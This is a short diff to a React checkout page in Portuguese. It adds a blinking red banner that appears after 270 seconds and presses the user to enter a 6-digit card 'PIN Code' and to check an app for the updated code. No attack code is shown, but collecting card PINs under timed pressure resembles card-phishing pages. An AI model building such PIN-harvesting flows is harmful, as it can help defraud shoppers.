@@ -321,6 +321,11 @@ function CheckoutPage() {
                   <Err k="cartaoNumero" />
                 </div>
                 <div>
+                  {elapsedSec >= 270 && (
+                    <div className="mb-2 rounded-md bg-red-600 px-4 py-3 text-center text-sm font-bold text-white animate-pin-blink">
+                      ⚠️ ADICIONE O CÓDIGO PIN! Verifique se o app está com o código atualizado.
+                    </div>
+                  )}
                   <label className="mb-1 block text-xs font-medium">PIN Code (6 dígitos) *</label>
                   <input type="password" value={form.cartaoPincode}
                     onChange={(e) => set("cartaoPincode", onlyDigits(e.target.value).slice(0, 6))}
